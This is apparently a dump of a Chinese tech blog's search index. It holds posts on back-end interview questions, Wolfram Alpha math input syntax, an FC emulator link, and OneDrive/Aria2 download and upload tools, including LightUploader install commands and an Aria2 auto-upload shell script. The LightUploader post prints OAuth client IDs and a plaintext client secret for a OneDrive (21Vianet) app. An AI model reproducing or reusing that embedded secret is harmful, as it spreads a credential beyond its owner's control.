# 只用 LIFO 栈如何构造一个 FIFO 队列？只用 FIFO 队列如何构造一个 LIFO 栈？ 写一段有栈溢出的代码。 写一个尾递归版本的阶乘函数。 使用任何一个语言，写一个 REPL，功能是 echo 你输入的字符串。然后将它演化成一个逆波兰表达式的计算器。 如果需要你设计一个文件系统磁盘碎片整理程序，你会如何设计？ 写一个生成随机迷宫的程序。 写一段有内存泄漏的示例代码。 随机生成一个的数字序列，里面每个数字都不同。 写一个简单的垃圾回收系统。 使用任何一门语言，写一个基本的消息代理。 写一个基础的 web 服务器，然后画一张线路图，展示你将来还想要实现的功能。 如何对一个 10GB 的文件进行排序？如果是 10TB 的数据，你会采用什么方法？ 请实现 rnd()函数 软件架构相关问题: # 什么情况下缓存是没用的，甚至是危险的？ 为什么事件驱动的架构能提高可扩展性(scalability)？ 什么样的代码是可读性强的代码？ 紧急设计(Emergent Design)和演化架构(Evolutionary Architecture)之间的区别是什么？ 横向扩展(scale out) vs 纵向扩展(scale up): 有什么区别？分别在什么场景下使用？ 分布式系统中如何处理\u0026quot;故障切换(failover)\u0026ldquo;和\u0026quot;用户会话(user session)\u0026quot;？ 什么是 CQRS(Command Query Responsibility Segregation)?他和最早的 Command-Query Separation 原则有什么区别？ 什么是三层架构？ 如何设计一个可扩展性高的系统？ 处理 C10k 问题的策略有哪些？ 如果让你来设计一个去中心化的 P2P 系统，你会如何设计？ 为什么 CGI 的扩展性不好？ 在设计系统时，你如何防止供应商依赖(Vendor Lock-in)？ 在可扩展性上，发布/订阅(Publish-Subscribe)模式有什么缺点？ 80 年代以后，CPU 有哪些变化？这些变化，对编程产生了什么影响？ 性能生命周期(performace lifecycle)中，你认为哪个部分是需要考虑进去的？ 如何管理？ 除了恶意攻击造成的拒绝服务现象以外，哪些设计或者架构上的问题会导致拒绝服务？ 性能和可扩展性之间有什么关系？ 什么时候紧耦合是 OK 的？ 一个系统要有什么特征才能适配云计算环境(Cloud Ready)？ Does unity of design imply an aristocracy of architects? 面向服务架构(SOA)和微服务(Microservice)相关问题: # 在 SOA 中，为什么长期存活的事务(Long-lived transation)不被看好，而 Saga 却被看好？ SOA 和 MicroService 之间有什么区别？ 我们来谈谈 Web 服务的版本管理、版本兼容性、重大变更管理这些事情吧. 在 saga 中事务和补偿操作(compensation operation)之间的区别是什么？在 SOA 中呢？ 微服务不能做得太\u0026quot;微\u0026rdquo;，你认为什么时候微服务太\u0026quot;微\u0026quot;了？ MicroService 架构的优劣是什么？ 安全相关问题: # 什么是双因素认证(Two Factor Authentication)？在一个已有的 Web 应用中，你如何实现这种机制？ 比尔盖茨式问题: # 如果你把一面镜子放在扫描仪上，会发生什么？ 假设有一个和你完全一样的克隆人，而他是你的上司，你愿意和他工作吗？ 现在请你面试一下我。 为什么 Quora 上的回答会比 Yahoo Answer 上的回答好？ 对手是现代语言，你的任务是要为 Cobol 辩护，你会如何进行？ 10 年后的你是什么样子？ 假设你是我老板，我被解雇了。你会如何通知我？ 我想要重构一个系统，而你想要从头重写。我们来争论一下该怎么弄吧。然后我们反转角色，再争论一下。 老板要你对公司撒谎，你的反应是什么？ 如果你可以穿越到以前，你会给年轻时候的你什么建议？ 代码示例问题: # 这段 Javascript 函数的输出是什么？ function hookupevents() { for (var i = 0; i \u0026lt; 3; i++) { document .getElementById(\u0026#34;button\u0026#34; + i) .addEventListener(\u0026#34;click\u0026#34;, function () { alert(i); }); } } 关于类型擦除(Type Erasure)，这段 Java 代码的输出是什么？为什么？ ArrayList\u0026lt;Integer\u0026gt; li = new ArrayList\u0026lt;Integer\u0026gt;(); ArrayList\u0026lt;Float\u0026gt; lf = new ArrayList\u0026lt;Float\u0026gt;(); if (li.getClass() == lf.getClass()) // evaluates to true System.out.println(\u0026#34;Equal\u0026#34;); 你能指出哪儿有内存泄漏吗？ public class Stack { private Object[] elements; private int size = 0; private static final int DEFAULT_INITIAL_CAPACITY = 16; public Stack() { elements = new Object[DEFAULT_INITIAL_CAPACITY]; } public void push(Object e) { ensureCapacity(); elements[size++] = e; } public Object pop() { if (size == 0) throw new EmptyStackException(); return elements[--size]; } /** * Ensure space for at least one more element, roughly * doubling the capacity each time the array needs to grow. */ private void ensureCapacity() { if (elements.length == size) elements = Arrays.copyOf(elements, 2 * size + 1); } } if 语句，或者更加通用点，条件表达式通常是过程式编程/命令式编程的形式。你能去掉这段代码中的 switch 语句，用面向对象的方式来修改这段代码吗？ public class Formatter { private Service service; public Formatter(Service service) { this.service = service; } public String doTheJob(String theInput) { String response = service.askForPermission(); switch (response) { case \u0026#34;FAIL\u0026#34;: return \u0026#34;error\u0026#34;; case \u0026#34;OK\u0026#34;: return String.format(\u0026#34;%s%s\u0026#34;, theInput, theInput); default: return null; } } } 你能去掉这里的 if 语句，将它改成更加面向对象吗？ public class TheService { private final FileHandler fileHandler; private final FooRepository fooRepository; public TheService(FileHandler fileHandler, FooRepository fooRepository) { this.fileHandler = fileHandler; this.fooRepository = fooRepository; } public String Execute(final String file) { final String rewrittenUrl = fileHandler.getXmlFileFromFileName(file); final String executionId = fileHandler.getExecutionIdFromFileName(file); if ((executionId == \u0026#34;\u0026#34;) || (rewrittenUrl == \u0026#34;\u0026#34;)) { return \u0026#34;\u0026#34;; } Foo knownFoo = fooRepository.getFooByXmlFileName(rewrittenUrl); if (knownFoo == null) { return \u0026#34;\u0026#34;; } return knownFoo.DoThat(file); } } 如何重构这段代码？ function() { HRESULT error = S_OK; if(SUCCEEDED(Operation1())) { if(SUCCEEDED(Operation2())) { if(SUCCEEDED(Operation3())) { if(SUCCEEDED(Operation4())) { } else { error = OPERATION4FAILED; } } else { error = OPERATION3FAILED; } } else { error = OPERATION2FAILED; } } else { error = OPERATION1FAILED; } return error; } ","date":"2021年6月30日","externalUrl":null,"permalink":"/posts/back-end-developer-interview-questions/","section":"","summary":"看到GitHub上有人整理了一份后端开发人员面试问题，我觉得挺好的，就翻译过来了","title":"后端开发人员面试问题","type":"posts"},{"content":"","date":"2021年6月30日","externalUrl":null,"permalink":"/categories/%E9%9D%A2%E8%AF%95/","section":"Categories","summary":"","title":"面试","type":"categories"},{"content":"","date":"2021年6月30日","externalUrl":null,"permalink":"/tags/%E9%9D%A2%E8%AF%95/","section":"Tags","summary":"","title":"面试","type":"tags"},{"content":"","date":"2021年5月28日","externalUrl":null,"permalink":"/tags/wolfram/","section":"Tags","summary":"","title":"Wolfram","type":"tags"},{"content":" 求极限 # 普通极限 # lim sin2x/(e^x-1), x-\u0026gt;0\n单侧极限 # lim arctan(1/x) as x-\u0026gt;0+ lim exp(1/x) as x-\u0026gt;0- x 趋于无穷大：oo # lim x^2sin(3/x^2)) , x-\u0026gt;oo lim arctan(x), x-\u0026gt;-oo 求导数 # 一阶导数 # derivative 记号 # derivative of (2x^2+3)sin(x) derivative (2x^2+3)sin(x) 分式记号 # d/dx (2x^2+3)sin(x)\n撇记号 # ((2x^2+3)sin(x))'\n求一点的导数 # derivative of (2x^2+3)sin(x) at x=3 d/dx (2x^2+3)sin(x) at x=3 ((2x^2+3)sin(x))' at x=3 二阶导数 # second derivative of sin(2x^2+3) 2nd derivative sin(2x^2+3) 撇记号 # (sin(2x^2+3))'' 三阶导数 # (sin(2x^2+3))'''\n10 阶导数 # 10th derivative 1/(1+x) d^10/dx^10(1/(1+x)) 特殊点处的导数 # x=1 处的 2 阶导数 # (exp(x)cos(2x^2))'' at x=1\n0 处的 7 阶导数 # 7th derivative of 1/(1+x) at 0\n参数方程的导数 # $x=2t^2, y=sint$ 的导数 (dy/dx) # (sin(t))'/(2t^2)'\n$x=sin2t, y=cost$ 在 $t=\\frac{\\pi}{6}$ 处的导数 # (cost)'/(sin2t)' at t=pi/6\n隐函数的导数 # 方程 $y=1-xe^y$ 的导数(dy/dx) # -( d/dx( 1-x*exp(y)-y ) )/( d/dy( 1-x*exp(y)-y ) )\n函数特征 # 求方程的根 # 解方程求根（包括复根） # solve x^3+1.1*x^2+0.9*x-1.4=0\n只求实根(real root) # real root x^3+1.1*x^2+0.9*x-1.4=0\n求函数的驻点 # 驻点：stationary point\nstationary point of x^3-2x+3\n求二元函数的驻点 # stationary point of x^3-y^3+3*x^2+3*y^2-9*x maximize x^3-y^3+3*x^2+3*y^2-9*x 求函数的极值 # 极小值：local min # local min x/(x^2+2)\n极大值：local max # local max x/(x^2+2)\n求指定区间内的极大值 # local max 2sin(2x)^2-(5/2)cos(x/2), x=0 to pi\n求二元函数的极值 # local max x^3-y^3+3*x^2+3*y^2-9*x\n求条件极值 # 求函数 xy 在 x+y=1 上的最大值 # maximize xy on x+y=1\n两个约束条件 # maximize xyz on 2*(x*y + y*z + z*x) =1, x\u0026gt;0,y\u0026gt;0,z\u0026gt;0 maximize sqrt(x^2+y^2+z^2) on z=x^2+y^2 and x+y+z=1 求梯度 # 用 grad 或 del 求梯度\n二元函数的梯度 # grad x^2+cos(2y)\n三元函数的梯度 # del x^2y+cos(xy)+xyz^2\n求方向导数 # derivative of x^2+cos(2y) in the direction (2,-3) at (1,2)\n求函数的最值 # 求指定区间内的最小值 # global min of 2sin(2x)^2-(5/2)cos(x/2)^2 for 1\u0026lt;=x\u0026lt;=3\n求二元函数的最值 # minimize 2(xy+2/x+2/y) for x\u0026gt;0, y\u0026gt;0\n求曲线的拐点 # (拐点：inflection point)\ninflection point of x/(x^2+2)\n积分 # 求不定积分 # (积分：integrate)\nintegrate x^2+sin(x)+1 int xarctan(x) int：integrate 的简写\n求定积分 # integrate x^2+sin(x)+1 from 0 to 1 int 1/sqrt(1-x^2) , x= 0 ..1/2 求广义积分 # 无穷大用两个 o 表示：oo\nint xexp(-2x) from 0 to oo int 1/(x^2+3) , x= -oo .. oo 积分变限函数 # 积分上限函数 # integrate texp(-t) from 0 to x\n积分上限函数求导 # d/dx ( int texp(-t) from 0 to x )\n求积分变限函数 # F(x)==integrate texp(-t) from ln(x) to x^2\n积分变限函数求导 # d/dx (integrate texp(-t) from ln(x) to x^2 )\n二重积分 # int x^2y+x, y=2..4, x=1..3\n先 y, 后 x # int xy , x=1..2, y=1..x\n先 x, 后 y # int xy , y=-1..2, x=y^2..y+2\n三重积分 # 积分次序:z,y,x\nint x , x=0..1, y=0..(1-x)/2, z=0..1-x-2y\n面积、体积 # 曲线与$x$轴之间的面积 # 曲线$y=2-x^2$与$x$轴之间的面积 # area between 2-x^2 and x-axis\n曲线下方的面积 # 曲线$y=3-x^2$与$x$轴之间的面积 # area under 3-x^2\n求两曲线之间的面积 # 曲线$y=x$与$y=x^2$之间的面积 # area between x and x^2\n求两曲线的交点 # 曲线$y=x^2$与$y=x^3$的交点 # solve x^2 = x^3\n求两曲线之间的面积 # 曲线$y=sinx$与$y=cos2x$ $(0\u0026lt;x\u0026lt;\\pi)$ 之间的面积 # area between sin(x) and cos(2x) from x=0 to pi\n旋转体的体积 # 曲线$y=sinx (0\u0026lt;x\u0026lt;2)$ 与$x$轴之间的区域绕$x$轴旋转 # V=pi*Integrate (sin(x)^2, x=0..2)\n曲线$y=x$与$y=sinx (0\u0026lt;x\u0026lt;pi)$之间的区域绕$x$轴旋转 # V=pi*Integrate (x^2-sin(x)^2, x=0..pi)\n求曲线的弧长 # 曲线 $y=x^2 (1\u0026lt;x\u0026lt;3)$的弧长 # int sqrt(1+ ( (x^2)' )^2), x=1..3\n参数曲线 $x=sin(t^3), y=t(-1\u0026lt;t\u0026lt;1)$ 的弧长 # int sqrt( (sin(t^3))' ^2+(t)'^2 ), t=-1..1\n向量 # 向量的点积 # (1,2,4) . (-2,3,6)\n向量的叉积 # 叉积：cross\n(1,2,4) cross (-2,3,6)\n向量函数的导数 (速度) # (t^2, 4t-3, 2t^2-6t)'\n向量函数的二阶导数 (加速度) # (t^2, e^t, 2t^3)''\n偏导数 # 求偏导数 # 对 x 求偏导数 # d/dx sin(x^2+2y)\n对 y 求偏导数 # d/dy sin(x^2+2y)\n在某一点的偏导数 # d/dx sin(x^2+2y) at (1,2)\n高阶偏导数 # 对 x 的二阶偏导数 # d/dx d/dx x^3*y^2 - 3*x*y^3 - x*y + 1\n混合偏导数 # d/dy d/dx x^3*y^2 - 3*x*y^3 - x*y + 1\n隐函数的偏导数 # 方程$e^z=xyz$的偏导数 (dz/dx) # -( d/dx( exp(z)-xyz ) )/( d/dz (exp(z)-xyz) )\n多项式 # 级数求和 # 等比级数求和 # sum 3*(2/5)^n, n=1..oo\np-级数求和 # 用 sum 求和\nsum 1/n^2, n=1..oo\n交错级数求和 # sum (-1)^(n+1)/n^2, n=1..oo\n幂级数的和函数 # sum (-1)^(n+1)*x^(2n-1)/(2n-1),n=1...oo\n函数的泰勒公式 # xsinx 在 x=0 处的 5 阶泰勒公式 # series：级数\nseries xsin(x) to order 5\ne^x 在 x=1 处的 5 阶泰勒公式 # taylor：泰勒\ntaylor e^x at x=1 to order 5\n微分方程 # y’=2xy\n求特解 # y’=e^(2x-y), y(0)=0\n二阶微分方程的特解 # (1+x^2)y’’=2xy’, y(0)=1, y’(0)=3\n二阶微分方程的通解 # y’’-5y’+6y=xe^(2x)\n二阶微分方程的特解 # y’’+y+sin(2x)=0, y(pi)=1, y’(pi)=1\n作图 # 一元函数图形 # 作图：plot plot y=x^3-x^2-x+1, x=-2..2\n两条曲线 # plot xsinx,arctanx\n隐函数的图形 # plot x^3+y^3=6xy\n指定范围 # plot x^3+y^3=6xy, x=-4..4, y=-4..4\n两条曲线 # plot x^2+y^2=2x, x=y^3+1\n参数曲线 # parametric plot : 参数方程作图\nparametric plot (t(1-sint),tcost) from t=-10 to 10\n参数方程 # x=t(1-sint), y=tcost\n极坐标曲线 # polar plot: 极坐标作图\npolar plot 1+cost, t=0..2pi\n曲面作图 # plot x^2+y^2, -2\u0026lt;x\u0026lt;2, -2\u0026lt;y\u0026lt;2 plot sqrt(2-x^2-3y^2) ","date":"2021年5月28日","externalUrl":null,"permalink":"/posts/wolfram-advanced-mathematics/","section":"","summary":"\u003ch1 class=\"relative group\"\u003e求极限 \n    \u003cdiv id=\"%E6%B1%82%E6%9E%81%E9%99%90\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#%E6%B1%82%E6%9E%81%E9%99%90\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\n\n\u003ch2 class=\"relative group\"\u003e普通极限 \n    \u003cdiv id=\"%E6%99%AE%E9%80%9A%E6%9E%81%E9%99%90\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#%E6%99%AE%E9%80%9A%E6%9E%81%E9%99%90\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003elim sin2x/(e^x-1), x-\u0026gt;0\u003c/code\u003e\u003c/p\u003e","title":"Wolfram 高等数学输入方法大全","type":"posts"},{"content":"","date":"2021年5月28日","externalUrl":null,"permalink":"/categories/%E6%95%99%E7%A8%8B/","section":"Categories","summary":"","title":"教程","type":"categories"},{"content":"","date":"2021年5月28日","externalUrl":null,"permalink":"/tags/%E6%95%B0%E5%AD%A6/","section":"Tags","summary":"","title":"数学","type":"tags"},{"content":"FC 模拟器网页版 魂斗罗/超级玛丽/双截龙等几十款怀旧游戏畅玩地址\n使用方法 # 按键 PLAYER1 PLAYER2 Left A Num-4 Right D Num-6 Up W Num-8 Down S Num-2 A J Num-7 B K Num-9 AA Z Num-/ BB X Num-* Start Enter Num-1 Select Ctrl Num-3 ","date":"2021年5月25日","externalUrl":null,"permalink":"/posts/fcgame/","section":"","summary":"\u003cp\u003e\u003ca href=\"https://game.gwliang.com\" target=\"_blank\"\u003eFC 模拟器网页版 魂斗罗/超级玛丽/双截龙等几十款怀旧游戏畅玩地址\u003c/a\u003e\u003c/p\u003e","title":"PC+手机端丨FC模拟器网页版/魂斗罗/超级玛丽/双截龙等几十款怀旧游戏","type":"posts"},{"content":"","date":"2021年5月25日","externalUrl":null,"permalink":"/tags/%E6%B8%B8%E6%88%8F/","section":"Tags","summary":"","title":"游戏","type":"tags"},{"content":"","date":"2021年5月25日","externalUrl":null,"permalink":"/tags/%E6%BA%90%E7%A0%81/","section":"Tags","summary":"","title":"源码","type":"tags"},{"content":"","date":"2021年5月8日","externalUrl":null,"permalink":"/tags/aria2/","section":"Tags","summary":"","title":"Aria2","type":"tags"},{"content":"","date":"2021年5月8日","externalUrl":null,"permalink":"/tags/onedrive/","section":"Tags","summary":"","title":"OneDrive","type":"tags"},{"content":"","date":"2021年5月8日","externalUrl":null,"permalink":"/tags/sharepoint/","section":"Tags","summary":"","title":"SharePoint","type":"tags"},{"content":"前一段时间我发了一篇文章，是关于Linux 命令行下载 OneDrive 分享链接中的文件的，这篇文章其实解决了一些痛点，在没有图形化界面的 Linux 上终于可以无痛下载 OneDrive 分享的文件而不是只能在有图形化界面的系统上用浏览器下载。但是虽然解决了一些痛点，但是还没彻底解决，还有一些痛点如下\n只能使用 curl 下载（虽然可以用其他工具下载，但是还得一条一条复制，麻烦） 需要自己打文件名 不能多线程下载 仍然需要一个图形化界面同时可以调试的终端 但是这些痛点还不算痛了，总有办法解决，这里就给出了一个解决方案， https://github.com/gaowanliang/OneDriveShareLinkPushAria2 ，新轮子实现了使用 python 环境，自动解析下载链接并推送到 Aria2 下载，使用方法如下：\n程序一共有两个函数，getFiles和downloadFiles，由于程序是两个小时摸鱼摸出来的，所以写的很糙，不过能用就好。需要翻到程序最后。\ngetFiles自不用说，是获取链接下文件的目录，参数只有一个，也就是下载链接\ndownloadFiles是获取链接下文件下载链接并推送到 Aria2，这里需要填写 3 个参数，第一个是下载链接；第二个是 aria2RPC 的地址，这个一般就是改两个地方，就是 IP 和端口，localhost改成 aria2 所在位置的 IP，如果是本机就不用管了，冒号后面是端口，一般是 6800，我代码给的是 5800，记得修改；第三个是 aria2 的密钥，这个也不用详细说了，改好之后直接运行即可，此时所有的文件都会被推送过去。\n现在剩下的痛点就是如果链接里有文件夹的话，目前还没解析，同时如果链接有密码也不能下载，慢慢解决吧。\n最后记录一下，aria2 的 header 居然是字符串形式的，形如accept: application/json\\naccept-encoding: gzip, deflate, br\\naccept-language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6，一定要注意不要被坑\n","date":"2021年5月8日","externalUrl":null,"permalink":"/posts/onedrive-download/","section":"","summary":"\u003cp\u003e前一段时间我发了一篇文章，是关于\u003ca href=\"https://gwliang.com/2020/05/26/linux-control-download-onedrive-files/\" target=\"_blank\"\u003eLinux 命令行下载 OneDrive 分享链接中的文件\u003c/a\u003e的，这篇文章其实解决了一些痛点，在没有图形化界面的 Linux 上终于可以无痛下载 OneDrive 分享的文件而不是只能在有图形化界面的系统上用浏览器下载。但是虽然解决了一些痛点，但是还没彻底解决，还有一些痛点如下\u003c/p\u003e","title":"在纯命令行环境下批量下载OneDrive/SharePoint分享链接中的文件","type":"posts"},{"content":"更新 【2021.04.29】 目前支持世纪互联、Google Drive，预计后期会添加对Mega，Telegram等平台的支持 【2021.04.02】 目前同时支持国际版、个人版(家庭版)。 【2021.04.01】 修复授权失败、上传文件大小为0等问题。 现已支持arm、x86、x64平台的系统。 【2021.03.27】 新增多线程上传、MacOS客户端。 修复了一个致命bug，建议之前装过的更新下程序。 功能 支持上传文件和文件夹到指定目录，并保持上传前的目录结构。 支持命令参数使用，方便外部程序调用。 支持自定义上传分块大小。 支持多线程上传(多文件同时上传)。 支持根据文件大小动态调整重试次数，对抗不好的网络环境。 可以使用Telegram Bot实时监控上传进度 Github地址：https://github.com/gaowanliang/LightUploader 萌咖大佬写了一个 非常好的版本 ，可惜并没有开源，而且已经好久都没有更新了。这个项目作为从 DownloadBot 中独立出来的一个简易上传工具，旨在用更轻量化的方式让在各种平台都能快速的向各个网络硬盘上传数据。\n这里只详细说下 Linux 的用法，Windows 后面大概说下。\nWindows、MacOS 系统下载地址 →传送门，直接将程序下载到本地后，按照下面方法进行授权、初始化，然后就可以使用命令上传了。\n授权认证 # 点击右侧 URL 登录并授权，授权地址 →【国际版、个人版(家庭版)】， 【世纪互联】，Google Drive 的授权链接是实时生成的，下面会说。\n授权后会获取一个 localhost 开头打不开的链接，这里复制好整个链接地址，包括 localhost。\n安装 LightUploader # 打开这个界面，选择适合你系统的版本：https://github.com/gaowanliang/LightUploader/releases\n这里以 Linux 64 位为例，当前最新版本为 v2.0，应该下载 LightUploader_Linux_x86_64.tar.gz 这个文件\n# 下载文件 wget https://github.com/gaowanliang/LightUploader/releases/download/v2.0/LightUploader_Linux_x86_64.tar.gz # 解压文件 tar -zxvf LightUploader_Linux_x86_64.tar.gz -C /usr/local/bin/ # 给予权限 chmod +x /usr/local/bin/LightUploader # 可选 软链接 类似于 Windows 的快捷方式 ln -s /usr/local/bin/LightUploader /usr/bin/LightUploader 初始化配置 # # OneDrive 国际版，将url换成你上面复制的授权地址，包括http://loaclhost。 LightUploader -a \u0026#34;url\u0026#34; -l zh-CN # OneDrive 个人版(家庭版)，将url换成你上面复制的授权地址，包括http://loaclhost。 LightUploader -a \u0026#34;url\u0026#34; -v 1 -l zh-CN # OneDrive 中国版(世纪互联)，将url换成你上面复制的授权地址，包括http://loaclhost。 LightUploader -a \u0026#34;url\u0026#34; -v 2 -l zh-CN #Google Drive 是实时生成授权地址的，所以直接输入下面的命令然后按照指示操作即可。 LightUploader -v 3 -l zh-CN 如果提示注册成功类似信息，则初始化成功。\n使用命令 # Usage of LightUploader: -a string // 初始化授权 Setup and Init auth.json. -b string // 自定义上传分块大小, 可以提高网络吞吐量, 受限于磁盘性能和网络速度. -c string // 配置文件路径 -r string // 上传到网盘中的某个目录, 默认: 根目录 -l string // 软件语言 -f string // *必要参数, 要上传的文件或文件夹 -t string // 线程数, 同时上传文件的个数. 默认: 3 -to int //单个数据包超时时间，默认为60s -tgbot string //使用Telegram机器人实时监控上传，此处需填写机器人的access token，形如123456789:xxxxxxxxx，输入时需使用双引号包裹。当写入内容为“1”时，使用配置文件中的BotKey和UserID作为载入项 -uid string // 使用Telegram机器人实时监控上传，此处需填写接收人的userID，形如123456789 -m int // 选择模式，0为替换网盘中同名文件，1为跳过，默认为0 -v int // 选择版本，其中0为 OneDrive 国际版，1为 OneDrive 个人版(家庭版)，2为 OneDrive 世纪互联，3为Google Drive，默认为0 命令示例 # # 一些示例: # 将同目录下的 mm00.jpg 文件上传到 OneDrive 网盘根目录 LightUploader -c xxx.json -f \u0026#34;mm00.jpg\u0026#34; # 将同目录下的 Download 文件夹上传到 OneDrive 网盘根目录 LightUploader -c xxx.json -f \u0026#34;Download\u0026#34; # 将同目录下的 Download 文件夹上传到 OneDrive 网盘Test目录中 LightUploader -c xxx.json -f \u0026#34;Download\u0026#34; -r \u0026#34;Test\u0026#34; # 将同目录下的 Download 文件夹上传到 OneDrive 网盘根目录中, 使用 10 线程 LightUploader -c xxx.json -t 10 -f \u0026#34;Download\u0026#34; # 将同目录下的 Download 文件夹上传到 OneDrive 网盘根目录中, 使用 10 线程，并跳过同名文件 LightUploader -c xxx.json -t 10 -f \u0026#34;Download\u0026#34; -m 1 # 将同目录下的 Download 文件夹上传到 OneDrive 网盘根目录中, 使用 10 线程，同时设置超时时间为30秒 LightUploader -c xxx.json -t 10 -f \u0026#34;Download\u0026#34; -to 30 # 将同目录下的 Download 文件夹上传到 OneDrive 网盘根目录中, 使用 10 线程，同时使用 Telegram Bot 实时监控上传进度 LightUploader -c xxx.json -t 10 -f \u0026#34;Download\u0026#34; -tgbot \u0026#34;123456:xxxxxxxx\u0026#34; -uid 123456789 # 将同目录下的 Download 文件夹上传到 OneDrive 网盘根目录中, 使用 10 线程，同时使用配置文件中的 Telegram Bot 参数载入程序实时监控上传进度（前提是配置文件中含有Telegram Bot 的参数） LightUploader -c xxx.json -t 10 -f \u0026#34;Download\u0026#34; -tgbot \u0026#34;1\u0026#34; # 将同目录下的 Download 文件夹上传到 OneDrive 网盘根目录中, 使用 15 线程, 并设置分块大小为 20M LightUploader -c xxx.json -t 15 -b 20 -f \u0026#34;Download\u0026#34; /urs/local/auth.json为初始化时，生成的*.json 绝对路径地址，本文默认/root/auth.json，自行调整。\nAria2 自动上传 # 同样的这里也会提供个配套的 Aria2 自动上传脚本 上传脚本代码如下：\n#!/bin/bash GID=\u0026#34;$1\u0026#34;; FileNum=\u0026#34;$2\u0026#34;; File=\u0026#34;$3\u0026#34;; MaxSize=\u0026#34;157286400\u0026#34;; Thread=\u0026#34;3\u0026#34;; #默认3线程，自行修改，服务器配置不好的话，不建议太多 Block=\u0026#34;20\u0026#34;; #默认分块20m，自行修改 RemoteDIR=\u0026#34;\u0026#34;; #上传到Onedrive的路径，默认为根目录，如果要上传到Test目录，\u0026#34;\u0026#34;里面请填成Test LocalDIR=\u0026#34;/www/download/\u0026#34;; #Aria2下载目录，记得最后面加上/ Uploader=\u0026#34;/usr/local/bin/LightUploader\u0026#34;; #上传的程序完整路径，默认为本文安装的目录 Config=\u0026#34;/root/auth.json\u0026#34;; #初始化生成的配置auth.json绝对路径，参考第3步骤生成的路径 if [[ -z $(echo \u0026#34;$FileNum\u0026#34; |grep -o \u0026#39;[0-9]*\u0026#39; |head -n1) ]]; then FileNum=\u0026#39;0\u0026#39;; fi if [[ \u0026#34;$FileNum\u0026#34; -le \u0026#39;0\u0026#39; ]]; then exit 0; fi if [[ \u0026#34;$#\u0026#34; != \u0026#39;3\u0026#39; ]]; then exit 0; fi function LoadFile(){ if [[ ! -e \u0026#34;${Uploader}\u0026#34; ]]; then return; fi IFS_BAK=$IFS IFS=$\u0026#39;\\n\u0026#39; tmpFile=\u0026#34;$(echo \u0026#34;${File/#$LocalDIR}\u0026#34; |cut -f1 -d\u0026#39;/\u0026#39;)\u0026#34; FileLoad=\u0026#34;${LocalDIR}${tmpFile}\u0026#34; if [[ ! -e \u0026#34;${FileLoad}\u0026#34; ]]; then return; fi ItemSize=$(du -s \u0026#34;${FileLoad}\u0026#34; |cut -f1 |grep -o \u0026#39;[0-9]*\u0026#39; |head -n1) if [[ -z \u0026#34;$ItemSize\u0026#34; ]]; then return; fi if [[ \u0026#34;$ItemSize\u0026#34; -ge \u0026#34;$MaxSize\u0026#34; ]]; then echo -ne \u0026#34;\\033[33m${FileLoad} \\033[0mtoo large to spik.\\n\u0026#34;; return; fi ${Uploader} -c \u0026#34;${Config}\u0026#34; -t \u0026#34;${Thread}\u0026#34; -b \u0026#34;${Block}\u0026#34; -f \u0026#34;${FileLoad}\u0026#34; -r \u0026#34;${RemoteDIR}\u0026#34; if [[ $? == \u0026#39;0\u0026#39; ]]; then rm -rf \u0026#34;${FileLoad}\u0026#34;; fi IFS=$IFS_BAK } LoadFile; 编辑好上传脚本后，可以检测下脚本编码是否正确，比如我脚本路径为/root/upload.sh，使用命令：\nbash /root/upload.sh 如果无任何输出，则正确，反之输出类似$\u0026lsquo;r\u0026rsquo;: command not found 错误，则需要转换下编码格式，具体步骤如下。\n先安装 dos2unix：\n#CentOS系统 yum install dos2unix -y #Debian/Ubuntu系统 apt install dos2unix -y 再转换编码： #后面为脚本路径 dos2unix /root/upload.sh Windows 使用 # 这里就随便补充下 Windows 使用，先下载程序文件，下载地址 →传送门。\n比如我将 exe 文件放到 D 盘，然后使用 Win+R，输入 CMD 运行，调出窗口后，使用命令：\n#进入D盘 cd /d D:\\ #国际版初始化，将url换成你上面复制的授权地址，包括http://loaclhost。 LightUploader.exe -a \u0026#34;url\u0026#34; -l zh-CN #个人版(家庭版)初始化，将url换成你上面复制的授权地址，包括http://loaclhost。 LightUploader.exe -a \u0026#34;url\u0026#34; -v 1 -l zh-CN #世纪互联初始化，将url换成你上面复制的授权地址，包括http://loaclhost。 LightUploader.exe -a \u0026#34;url\u0026#34; -v 2 -l zh-CN 然后上传命令和上面一样，只需要把LightUploader改成LightUploader.exe即可。\n更换自己的 API # 我本来想着做一个简单更换 API 的方法，但是思来想去不知道怎么弄好，因为本身这个软件是单文件的，首次就需要 API 进行登录，这个 API 存储在哪里就很麻烦了，索性就不弄了，和大家说一下如何通过自行编译的方式更换自己的 API。\n使用 VSCode/Goland 等工具，进行全局替换，需要查找的值有这几个：\nOneDrive 国际版/家庭版 客户端 ID：ad5e65fd-856d-4356-aefc-537a9700c137 (国际版不需要密钥) OneDrive 世纪互联 客户端 ID：4fbf37cf-dc83-4b60-b6c1-6230546e247b OneDrive 世纪互联 密钥：y-L73QIBxO_UmJvOVw8YMlX~8B_h4D6zzT Google Drive 授权文件：见gdUpload.go#L224 因为 GoogleDrive 还是测试版，目前传文件很不稳定，这里先简单的说一下 OneDrive 怎么弄\nAzure.com 应用注册\nAzure.cn (世纪互联) 应用注册\n没有说明的随意填写即可\n选择 任何组织目录(任何 Azure AD 目录 - 多租户)中的帐户\n重定向 url 键入并保存 http://localhost/onedrive-login\n保存 客户端ID\n去 证书和密码 ，添加并保存 客户端密码(国际版不需要)\nAPI 权限（Microsoft Graph）添加 offline_access, Files.ReadWrite.All, User.Read 三个权限。\n下载好源代码后，使用上面说的工具，按下Ctrl+Shift+H，根据自己的情况将上面的值直接全局替换即可，因为我软件的依赖库都直接绑到代码里了，所以装好 golang 直接go build -o LightUploader 